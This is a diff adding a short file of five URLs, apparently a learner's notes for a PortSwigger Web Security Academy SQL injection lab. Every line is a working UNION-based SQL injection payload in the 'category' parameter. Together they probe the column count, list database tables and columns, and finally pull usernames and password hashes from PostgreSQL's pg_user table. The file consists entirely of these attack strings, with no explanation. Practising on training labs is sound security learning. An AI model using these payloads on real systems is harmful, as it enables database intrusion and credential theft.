@@ -1,0 +1,11 @@
+https://acf01f081fd0d393803597ca00a000a6.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--
+
+https://acf01f081fd0d393803597ca00a000a6.web-security-academy.net/filter?category=Pets' UNION SELECT 'a','b'--
+
+https://acf01f081fd0d393803597ca00a000a6.web-security-academy.net/filter?category=Pets' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+
+https://acf01f081fd0d393803597ca00a000a6.web-security-academy.net/filter?category=Pets' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name='pg_user'--
+
+https://acf01f081fd0d393803597ca00a000a6.web-security-academy.net/filter?category=Pets' UNION SELECT usename,passwd FROM pg_user--
+
+
